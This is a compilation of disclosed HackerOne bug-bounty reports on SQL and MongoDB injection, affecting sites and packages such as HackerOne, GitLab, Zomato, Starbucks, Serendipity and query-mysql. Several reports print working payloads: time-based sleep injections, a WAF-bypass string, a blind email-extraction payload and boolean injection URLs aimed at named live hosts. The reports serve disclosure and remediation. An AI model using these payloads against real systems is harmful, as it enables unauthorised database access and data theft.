i was able to extract all the database names for PoC, there is no doubt in my mind that i could login to the admin panel and compromise the entire DoD Information System.

## Impact
Remote Code Execution

## Step-by-step Reproduction Instructions

1. Visit:███ and go to the staff links 'CIMScan'
Image: █████/34570b2eaa899ae001e1bc666be3546a.png
2. ████/c400bc1369bddeca580646b14c38a562.png
3. ████/32e085f593bfbf8599359d968cf52dc0.png

## Product, Version, and Configuration (If applicable)
Web Application

## Suggested Mitigation/Remediation Actions
I will report it to CIMScan since i am not sure if this affect's your code, it might very well be the code of CIMScan which in that case you will need to remove it from your website to prevent employees from being compromised.

## Impact

Remote Code Execution

**Summary (team):**

A critical SOAP WSDL Parser SQL Code Execution vulnerability (assigned CVE-2018-16803) was discovered on a Department of Defense (DoD) website by Joel Aviad Ossi. If properly exploited this could have resulted in the complete loss of the website and the underlining information system. Researcher websecnl was able to expertly demonstrate this vulnerability to the DoD's Vulnerability Disclosure Program (VDP), and it was rapidly mitigated by the system owner. Very well done websecnl, thank you!

DoD VDP Team

---

### [SQL Injection Proof of Concept for Starbucks URL](https://hackerone.com/reports/360539)

- **Report ID:** `360539`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Starbucks
- **Reporter:** @gbadebo
- **Bounty:** - usd
- **Disclosed:** 2019-01-09T18:49:06.831Z
- **CVE(s):** -

**Vulnerability Information:**

browser: firefox quantum 60.0.1 64 bit
os: windows 10
sqli type: char formula injection
info found: oracle database system
url: https://www.starbucks.de/coffee/our-coffees/format/whole-bean
injected url using oracle concatenation and char functions: https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)
steps to find oracle dbms
1. inject the following url with order by 1 written with char and oracle concatenation resulting in an erronous page, which indicates oracle db is used.
2. https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)
3.then inject the following url with mysql char using order by 1, which results in no error.  so is not mysql dbms.
4. https://www.starbucks.de/coffee/our-coffees/format/whole-beanCHAR(111, 114, 100, 101, 114, 32, 98, 121, 32, 49)
5. finally try and inject with microsoft sql server char injection using order by 1 in char concatenation. which results in no error.  so is not a microsoft sql server database.  
6. https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHAR(111) + CHAR(114) + CHAR(100) + CHAR(101) + CHAR(114) + CHAR(32) + CHAR(98) + CHAR(121) + CHAR(32) + CHAR(49)
description:
by process of elimination by error.  i was able to figure out which database starbucks is using for that url.  basically, the only sql injection code that errored was the oracle char concatenation.  leading me to believe that you use oracle dbms.

images included attached showing error with oracle sql injection and no error with ms sql nor mysql injection,

## Impact

by knowning that the database is oracle this can lead to furthder exploits to gain priviledged information as it is no longer a blind sql exploit.  which is a lot easier to deploy.  the attacker can now streamline the sql injection to be specifically based on oracle sql syntax.

---

### [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter](https://hackerone.com/reports/435066)

- **Report ID:** `435066`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2018-11-30T01:26:39.932Z
- **CVE(s):** -

**Vulnerability Information:**

The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:

**Locally**:
```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**HackerOne.com**
```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**Additional proof**
```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## Impact

The SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.

**Summary (team):**

# Summary
The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint was vulnerable to a SQL injection. This allowed an attacker to extract information from the public and secure schema. We have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.

# Timeline

| **Time (PST)**            | **Action**                                                                          |
|---------------------------|-------------------------------------------------------------------------------------|
| November 6th, 2018 8:04a  | @tomdev notices a `PG::SyntaxError` exception in hackerone.com's backend 🙌           |
| November 6th, 2018 8:04a  | @jjoos alerted InfoSec, people were assigned tasks                                  |
| November 6th, 2018 8:20a  | Root cause was identified and a hot fix was put up for review                       |
| November 6th, 2018 8:52a  | This report was filed to document the vulnerability                          |
| November 6th, 2018 12:42p | A hot fix for the security vulnerability was released                               |
| November 15th, 2018 2:20p | Investigation was concluded and determined that the vulnerability was not exploited |

# Impacted Data
We have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.

# Root cause
HackerOne.com has a GraphQL endpoint that the frontend uses to query its backend. When the embedded submission form feature was introduced, a design decisions was made to leverage a GraphQL parameter rather than an input field. Input fields are properly sanitized. However, GraphQL parameters, were not. These GraphQL parameters were not designed to take raw user input. Here's the vulnerable piece of code:

```ruby
unless database_parameters_up_to_date
  safe_query = ''

  new_parameters.each do |key, value|
    safe_query += "SET SESSION #{key} TO #{value};" # <-- 😮
  end

  begin
    connection.query(safe_query)
  rescue ActiveRecord::StatementInvalid => e
    # NOTE: when the transaction is aborted, we cannot set or reset any parameters.
    # Changes of previous SET statements are undone as well, so we can safely do
    # nothing here
    raise e unless e.cause.is_a? PG::InFailedSqlTransaction
  end
end
```

The reason why we have to pass down these parameters to the PostgreSQL query level, is because HackerOne.com's database has two separate schemas. The `public` schema, which is where all the data resides and what we call the `secure` schema. The latter is a set of derived views from the `public` schema that returns data based on the currently signed in user (or signed out, for that matter). By default, GraphQL queries the `secure` schema. These derived views are automatically generated based on authorization logic we define in our GraphQL layer. This reduces the changes of information disclosure vulnerabilities, such as IDOR and SQL injections. Even when an attacker were to be able to query the `secure` schema, it'd reduce the number of exposed records significantly.

---

### [blind sql injection](https://hackerone.com/reports/374027)

- **Report ID:** `374027`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Hanno's projects
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2018-11-09T21:02:58.104Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
There exists a possibility that your Serendipity installation is vulnerable to a blind sql injection.

**Description:** 
By sending specially crafted SQL commands to `/plugin/tag/` and timing how long it takes for the server to respond, it is quite possible that the blog backend is interepreting this as actual SQL commands and not just user input.

For example, if we visit `https://betterscience.org/plugin/tag/peerj` we get all articles tagged with `peerj`. I ran the following timed tests replacing `peerj` with the sql commands below:

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.25 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.256 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.437 s
```

## Steps To Reproduce:

Request:
```
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendipity[name]=dxctfnid; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22
Host: betterscience.org
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

```
## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

---

### [SQL injection in Serendipity (serendipity_fetchComments)](https://hackerone.com/reports/374748)

- **Report ID:** `374748`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Hanno's projects
- **Reporter:** @bb9866f3f743d6bf69b6836
- **Bounty:** - usd
- **Disclosed:** 2018-11-09T14:44:05.375Z
- **CVE(s):** -

**Vulnerability Information:**

##Summary

An authenticated administrator can alter *Entries to display on frontpage* and *Entries to display in Feeds* in a way to perform a SQL injection and extract database records or access files on the underlying system.

##Description

The function `serendipity_fetchComments` (implemented in `functions_comments.inc.php`) allows to obtain an array of comments related to a specific entry id. It accepts six parameters that will impact the query:
- `$id`: casted as integer and then used in the query;
- `$limit`: used unescaped in the query;
- `$order `: used unescaped in the query;
- `$showAll`: adds a fixed condition to the query;
- `$type`: used unescaped in the query;
- `$where`: used unescaped in the query.

Thus, any use of `serendipity_fetchComments` where either `$limit`, `$order`, `$type` or `$where` are user-controlled will result in a SQL injection. Two vulnerable calls were discovered.

The first one can be found in `rss.php`. The value of `$serendipity['RSSfetchLimit']` comes from website's configuration (*Entries to display in Feeds*) and is used as second argument of `serendipity_fetchComments`:

```php
<?php
// [...]
switch ($_GET['type']) {
    case 'comments_and_trackbacks':
    case 'trackbacks':
    case 'comments':
        $entries     = serendipity_fetchComments(isset($_GET['cid']) ? $_GET['cid'] : null, $serendipity['RSSfetchLimit'], 'co.id desc', false, $_GET['type']);
```

The same way, `serendipity_printCommentsByAuthor` (implemented in `functions_comments.inc.php`) uses `$serendipity['fetchLimit']` as second argument. The value of `$serendipity['fetchLimit']` also comes from website's configuration (*Entries to display on frontpage*):

```php
<?php
// [...]
    $sql_limit = $serendipity['fetchLimit'] * ($serendipity['GET']['page']-1) . ',' . $serendipity['fetchLimit'];
    $c = serendipity_fetchComments(null, $sql_limit, 'co.entry_id DESC, co.id ASC', false, $type, $sql_where);
```
## Steps To Reproduce

  1. Access https://blog.fuzzing-project.org/serendipity_admin.php?serendipity[adminModule]=configuration as authenticated administrator.
  1. Alter either *Entries to display on frontpage* or *Entries to display in Feeds* (under *Appearance and Options*) by adding any non-numeric character in one of these fields.
  1. Access https://blog.fuzzing-project.org/rss.php?type=comment if you edited *Entries to display in Feeds*, or the homepage is you edited *Entries to display on frontpage*. The character 
broke the correctness of the query and an error message will be displayed.

I don't have any test environment at the moment but let me know if you need a real payload to show it's possible to extract arbitrary database records.

## Impact

An authenticated administrator can extract database records, including password hashes of other users of the instance. Depending on database user privileges, it could also allow to access other bases or files on the underlying server.

**Summary (team):**

Bug in upstream Serendipity software, got fixed in version 2.1.3.

The impact is limited, as it requires a backend login. Still it's a great finding and many thanks to the reporter.

---

### [[www.zomato.com] SQLi - /php/██████████ - item_id](https://hackerone.com/reports/403616)

- **Report ID:** `403616`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @gerben_javado
- **Bounty:** 4500 usd
- **Disclosed:** 2018-09-11T05:04:45.002Z
- **CVE(s):** -

**Summary (team):**

Thanks @gerben_javado for helping us keep @zomato secure :)

**Summary (researcher):**

Thanks to the entire @Zomato team for doing this challenge. Its a pleasure to be back in the bug bounty game after a while.

#Introduction
So I managed to find SQLi on `https://www.zomato.com/php/██████████` in the POST parameter item_id. Debugging and exploiting this issue was somewhat confusing in the beginning because there seems to be database caching going on based on the int value that is given. So for example when you submit item_id=1111-stuffthatchangeshere multiple times the payload won't work anymore. In order to circumvent this caching you need to increment or decrement the integer before the payload every request.

# Exploitation
I started of simple to really understand that we were dealing with a SQLi. The sleep command was the way for me to proof this and this worked quite easily using my previous discovered Akamai Kona Bypass:

```
POST https://www.zomato.com/php/██████████
Body: res_id=1111&method=add_menu_item_tags&item_id=1111-sleep/*f*/(10)&new_tags[]=3&menu_id=1111
```

From there I wanted to proof data extraction and came up with the following POC:

Response time: 6090ms
```
POST https://www.zomato.com/php/██████████
res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111
```

Response time: 910ms
```
POST https://www.zomato.com/php/██████████
res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111
```

This proofs that version() starts with a 5 and shows that we can extract data out of the database. At this point I stopped testing to write the report. Good luck fixing.

#Impact
Full database access holding private user information.

---

### [[express-cart] Customer and admin email enumeration through MongoDB injection](https://hackerone.com/reports/397445)

- **Report ID:** `397445`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @becojo
- **Bounty:** - usd
- **Disclosed:** 2018-09-10T22:58:42.734Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report an injection in express-cart
It allows to enumerate the email address of the customers and the administrators.

# Module

**module name:** express-cart
**version:** 1.1.7
**npm page:** `https://www.npmjs.com/package/express-cart`

## Module Description

expressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

## Module Stats

31 downloads in the last week

# Vulnerability

## Vulnerability Description

The vulnerability is caused by the lack of user input sanitization in the login handlers. In both cases, the customer login and the admin login, parameters from the JSON body are sent directly into the MongoDB query which allows to insert operators. These operators can be used to extract the value of the field blindly in the same manner of a blind SQL injection. In this case, the `$regex` operator is used to guess each character of the token from the start. 

## Steps To Reproduce:

Use MongoDB `$regex` operator to test if each characters of the emails in the database.

The provided Python script exploits the customer login to find all the customer emails in the database. Some recursion is used to make sure all of the fields

The attached screenshot is the customer list currently in my database. The output of the script is the following:

```
$ python exploit.py 
alan.k@example.com
alice.r@hotmail.com
ben76543@gmail.com
bob@test.com
```

## Patch

Ensure the parameters are indeed strings before doing a MongoDB request. There are multiple ways this could be achieved. Using `toString` on the parameters is good enough. 
 
```
db.customers.findOne({email: req.body.loginEmail}, (err, customer) => { // eslint-disable-line
```
becomes
```
db.customers.findOne({email: req.body.loginEmail.toString()}, (err, customer) => { // eslint-disable-line
```

While a user can still trigger an exception by replacing `toString` with something else than a function, it effectively mitigates the vulnerability.

## Supporting Material/References:

- OS: Ubuntu 16.04.3 LTS
- Node.js version: 8.11.1 
- For the script: Python 2.7.12 and the requests package

# Wrap up
- I contacted the maintainer to let them know: No
- I opened an issue in the related repository: No

## Impact

Administrator emails could be used for phishing attemps and spam. Customers emails could be used by an adversary to deliver spam, steal customers and more. In this GDPR era, leaking customer emails is not very desirable.

---

### [SQL Injection in report_xml.php through countryFilter[] parameter](https://hackerone.com/reports/383127)

- **Report ID:** `383127`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Valve
- **Reporter:** @moskowsky
- **Bounty:** 25000 usd
- **Disclosed:** 2018-07-27T21:29:23.789Z
- **CVE(s):** -

**Summary (team):**

An unvalidated parameter on an partner reporting page (report_xml.php) could be used to read certain SQL data from a single backing database.

**Summary (researcher):**

Blind SQL Injection && Akamai WAF Bypass. Wait for the write-up ;)

---

### [[www.zomato.com] SQLi on `order_id` parameter](https://hackerone.com/reports/358669)

- **Report ID:** `358669`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @saltedfish
- **Bounty:** 1000 usd
- **Disclosed:** 2018-05-30T03:59:27.030Z
- **CVE(s):** -

**Summary (team):**

@saltedfish found that a parameter `order_id` was vulnerable to SQLi.

###POC 
(for everyone to learn from this disclosed report)

- There was an endpoint which had `order_id` as one of the parameters.
- Requesting `'-if(1=2,'0','1')-'`  in `order_id` parameter changed the Response Length and upon further investigation from @saltedfish, he found that the boolean technique could be used to proof data retrieval.

We'd like to thank @saltedfish for helping us in keeping @zomato secure :)

[REQUEST] Also, a small request to everyone reading this report, Burp Suite Free Version offers lot of features to start with and HackerOne has partnered with Burp Suite to offer 3 months free of Burp Suite Pro to Hackers on achieving `500 Reputation Points`. Use that opportunity instead of using Pirated Version.

Cheers.

---

### [[query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database](https://hackerone.com/reports/311244)

- **Report ID:** `311244`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-05-19T12:53:02.893Z
- **CVE(s):** CVE-2018-3754

**Vulnerability Information:**

Hi Guys,

There is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.

## Module

**query-mysql**

Install this module in your project like dependency

https://www.npmjs.com/package/query-mysql

version: 0.0.2

Stats
0 downloads in the last day
13 downloads in the last week
85 downloads in the last month

~1000 estimated downloads per year


## Description

Most of functions in ```query-mysql``` module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.

This is one of those functions, which allows to select record from the table depends on value for the column:

```javascript
// node_modules/query-mysql/lib/base.js, line 172
    fetchById: function (table, id, name_id, callback) {
        connect(function (connected) {
            if (connected) {

                connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'", function (err, rows, fields) {
                    connection.end();
                    console.log("fetchById");
                    //if (err) throw err;
                    if (err) {
                        callback("error", null);
                    }else{						
                        callback("success", rows);
                    };
                })

            }else{
                callback("error_connection", null);
            };
        })
    },
```

The query itself is simple string with values passed by the user concatenated with SQL:

```javascript
connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'"
```

If we assume, that ```table```, ```name_id``` and ```id``` will be passed as, respectively, ```users```, ```id``` and ```1```, we should get following query:

```sql
SELECT * FROM users WHERE id='1'
```
It returns record from table ```users```, where ```id``` equals 1.

Now, if we pass in ```id``` malicious query, like ```1\' OR 1=1-- ``` - we get this:

```sql
SELECT * FROM users WHERE id='1' OR 1=1-- 
```
This query returns **all** records from table ```users```


## Mitigation

```query-mysql``` relies on ```mysql``` module. This module allows to use Preparing Queries (Prepared Statements) - https://www.npmjs.com/package/mysql#preparing-queries:

```
You can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:

var sql = "SELECT * FROM ?? WHERE ?? = ?";
var inserts = ['users', 'id', userId];
sql = mysql.format(sql, inserts);

Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As 
```

This is the simplest way to avoid simple SQL Injection vulnerabilites.

## Steps To Reproduce:

- install ```query-mysql``` module:

```
$ npm install query-mysql
```

- log in to your local MySQL instance and create database ```test``` using following SQL:

```sql
-- Table structure for table `users`

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `username` varchar(50) DEFAULT NULL,
  `password` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
```

- populate data by adding couple of records:

```
mysql> select * from users;
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| user     | user     |
| noob     | noob     |
+----------+----------+
3 rows in set (0.00 sec)
```


- create sample application:

```javascript
// app.js
'use strict'

const query = require('query-mysql')

query.configure({
  'host': '127.0.0.1',
  'user': 'root',
  'password': 'root',
  'database': 'test'
})

query.base.fetchById('users', 'noob', 'username', (msg, res) => {
  console.log(msg, res)
})
```

- run application:

```
$ node app.js
```

- result:

```
fetchById
success [ RowDataPacket { username: 'noob', password: 'noob' } ]
```

- Now, modify query into following one:

```javascript
// app.js
//... cut for readibility
query.base.fetchById('users', 'noob\' or 1=1-- ', 'username', (msg, res) => {
  console.log(msg, res)
})
```

- run application again:

```
$ node app.js
```

- this time result set contains all records from table ```users```:

```
fetchById
success [ RowDataPacket { username: 'admin', password: 'admin' },
  RowDataPacket { username: 'user', password: 'user' },
  RowDataPacket { username: 'noob', password: 'noob' } ]
```

Other functions in ```query-mysql``` module contains the same vulnerability. 

## Supporting Material/References:


- macOS 10.13.3
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.3
- npm version: 5.5.1
- mysql  Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to fetch/manipulate data in database

---

### [SQL injection in MilestoneFinder order method](https://hackerone.com/reports/298176)

- **Report ID:** `298176`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 2000 usd
- **Disclosed:** 2018-04-27T02:20:24.581Z
- **CVE(s):** CVE-2017-0914

**Vulnerability Information:**

The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **index** action is requested, the `milestones` method is called. Here's the first two lines of the method:

**app/controllers/groups/milestones_controller.rb**
```ruby
def milestones
    search_params = params.merge(group_ids: group.id)

    milestones = MilestonesFinder.new(search_params).execute
    # ...
```

This code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:

**app/finders/milestone_finder.rb**
```ruby
  def execute
    return Milestone.none if project_ids.empty? && group_ids.empty?

    items = Milestone.all
    items = by_groups_and_projects(items)
    items = by_title(items)
    items = by_state(items)

    order(items)
  end
```

The `order` call on the last line is implemented as following: 

**app/finders/milestone_finder.rb**
```ruby
 def order(items)
    if params.has_key?(:order)
      items.reorder(params[:order])
    else
      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')
      items.reorder(order_statement)
    end
  end
```

As can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:

**Request**
```
GET /groups/my-test-group/-/milestones HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response**
```json
[
  {
    "title": "3",
    "name": "3",
    "id": 429944
  },
  {
    "title": "4",
    "name": "4",
    "id": 429943
  }
]
```

Then, consider the following SQL injection payload:

```sql
(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)
```

This payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(<>, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **not** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.

To prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:

**Encoded payload**
```
%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29
```

Now submit the first request:

**Request 1 (`a`)**
```
GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response 1**
```
HTTP/1.1 200 OK
Server: nginx
...

[{"title":"3","name":"3","id":429944},{"title":"4","name":"4","id":429943}]
```

In the response above the milestones are sorted **descending** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observer:

**Request 2 (`j`)**
```
GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...
```

**Response 2**
```
HTTP/1.1 200 OK
Server: nginx
...

[{"title":"4","name":"4","id":429943},{"title":"3","name":"3","id":429944}]
```

Because the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.

This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).

## Impact

An attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.

---

### [ SQL injection ](https://hackerone.com/reports/311922)

- **Report ID:** `311922`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T18:15:06.703Z
- **CVE(s):** -

**Summary (researcher):**

Initially I discovered a Defunct admin panel with default credentials, admin/admin. This was vulnerable to a blind SQL  Injection but I wasn't able to successfully exploit the login panel. I later google dorked for php files on the subdomain and ended up finding another end point that was vulnerable to SQLI. I then used SQLMap to exploit and then read the banner and user name of the website. I ended up discovering this sub domain and the previous SQL injection shared the same database. I later google dorked the end point and found another subdomain using the same end point and exploited it in a similar fashion to this one

---

### [[critical] sql injection by GET method](https://hackerone.com/reports/319279)

- **Report ID:** `319279`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Khan Academy
- **Reporter:** @securitygab
- **Bounty:** - usd
- **Disclosed:** 2018-03-06T18:16:20.077Z
- **CVE(s):** -

**Vulnerability Information:**

Hey there, after tampering a bit with the values, since I figured out your backend is not php (most likely django or nodejs), I found an SQL injection .
You can view my steps to reproduce, if you need additional screenshots, please let me know.
Regards Gabriel Kimiaie

## Impact

If I dig deeper, I may be able to read datas from your database, hopefully I won't do it.

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Boolean

**Please describe the results of your verification attempt.**
After submitting a single quote, I got the 500 error. after few steps, I got rid of the 500 error by forging a valid sql query which is as follows:
https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv 
it returns to me all csv since 1 is equal to one
when changing the boolean condition:
https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv
(and '1'=='0): only the english csvs are shown.

---

### [[https://reviews.zomato.com] Time Based SQL Injection](https://hackerone.com/reports/300176)

- **Report ID:** `300176`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @samengmg
- **Bounty:** 1000 usd
- **Disclosed:** 2018-02-02T07:21:31.720Z
- **CVE(s):** -

**Summary (team):**

@samengmg found an cookie based SQL injection on https://reviews.zomato.com.

**Summary (researcher):**

I noticed that two cookies were submitted during a request during the login page of ***https://reviews.zomato.com***
```
orange
squeeze
```

Due to the oddly named cookies, I decided to fuzz them. Eventually, I discovered both are vulnerable to SQL injection with different techniques. 
 
For orange cookie
***Initial payload to determine issue***
```
1'=sleep(10)='1 
```
Not only the server slept for 10 seconds but the HTTP response code was 200 (the normal response is a 302 redirect) 

This led me to craft out the following payloads:
***Payloads used to determine database version:***
```
'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
``` 

For squeeze cookie:
***Initial payload to determine issue***
```
1 ' or true# 
1 ' or false#
``` 
